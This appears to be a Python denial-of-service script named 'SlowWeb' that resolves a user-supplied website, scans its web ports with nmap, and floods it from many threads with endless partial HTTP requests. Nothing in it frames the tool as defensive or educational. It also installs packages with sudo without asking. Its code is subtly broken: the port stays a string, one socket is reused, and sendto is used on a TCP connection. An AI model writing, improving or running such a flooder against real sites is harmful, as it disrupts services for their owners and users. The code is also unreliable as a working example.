import os
import subprocess
import sys
import socket
import time
import threading
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Function to clear screen and show professional title with $
def clear_screen():
    os.system('clear')  # Use 'cls' for Windows
    print(Fore.CYAN + r"""
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSS      SlowWeb        SSSSSSSSSSSSSSSSSSSSSS
SS            Distributed Denial of Service Tool             SS
SS                        By BERCEAUPISTE                    SS
SS                GitHub: https://github.com/berceaupiste    SS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
                  
****************************************************************
                   SlowWeb Test Tool by BERCEAUPISTE                   
*************************************************************
""")

# Function to check if required tools are installed
def check_tools():
    print(Fore.YELLOW + "[*] Checking dependencies...\n")

    # Check if ping is installed
    try:
        subprocess.run(['ping', '-c', '1', 'google.com'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(Fore.GREEN + "[+] Ping is installed." + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "[!] Ping is not installed. Installing..." + Style.RESET_ALL)
        install_ping()

    # Check if nmap is installed
    try:
        subprocess.run(['nmap', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(Fore.GREEN + "[+] Nmap is installed." + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "[!] Nmap is not installed. Installing..." + Style.RESET_ALL)
        install_nmap()

# Function to install ping (for Linux)
def install_ping():
    os.system('sudo apt update && sudo apt install iputils-ping -y')

# Function to install nmap (for Linux)
def install_nmap():
    os.system('sudo apt update && sudo apt install nmap -y')

# Function to get target details
def get_target_details():
    website_name = input(Fore.YELLOW + "Enter website URL (e.g., example.com): " + Style.RESET_ALL)
    print(Fore.GREEN + f"\n[+] Resolving IP address for {website_name}...")

    # Correctly resolving the IP address using 'dig' command to avoid errors
    try:
        result = subprocess.check_output(['dig', '+short', website_name])
        target_ip = result.decode().strip()
        print(Fore.GREEN + f"[+] IP address of {website_name}: {target_ip}" + Style.RESET_ALL)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[!] Failed to resolve IP address." + Style.RESET_ALL)
        sys.exit(1)

    # Scan only specific ports: HTTP (80) and HTTPS (443)
    print(Fore.YELLOW + f"[+] Scanning ports 80 and 443 of {target_ip} using nmap..." + Style.RESET_ALL)
    try:
        scan_result = subprocess.check_output(["nmap", "-p80,443", target_ip]).decode()
        print(Fore.GREEN + scan_result + Style.RESET_ALL)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[!] Failed to scan ports with nmap." + Style.RESET_ALL)
        sys.exit(1)

    return target_ip, website_name

# Function to perform attack
def attack(target_ip, target_port, num_threads, website_name):
    print(Fore.CYAN + f"\n[*] Starting attack on {target_ip}:{target_port} with {num_threads} threads..." + Style.RESET_ALL)
    print("[*] Website: " + website_name)
    print("[*] Press Ctrl+C to stop the attack")

    def attack_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        while True:
            try:
                sock.connect((target_ip, target_port))
                sock.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
                sock.sendto(b'Host: ' + target_ip.encode() + b'\r\n\r\n', (target_ip, target_port))
            except:
                pass

    # Creating threads
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        thread.start()

    while True:
        time.sleep(0.1)  # Keeps the main thread alive

def main():
    clear_screen()
    check_tools()
    target_ip, website_name = get_target_details()

    target_port = input(Fore.YELLOW + "Enter target port (e.g., 80 for HTTP): " + Style.RESET_ALL)
    num_threads = int(input(Fore.YELLOW + "Enter number of threads to use: " + Style.RESET_ALL))
    attack(target_ip, target_port, num_threads, website_name)

if __name__ == "__main__":
    main()
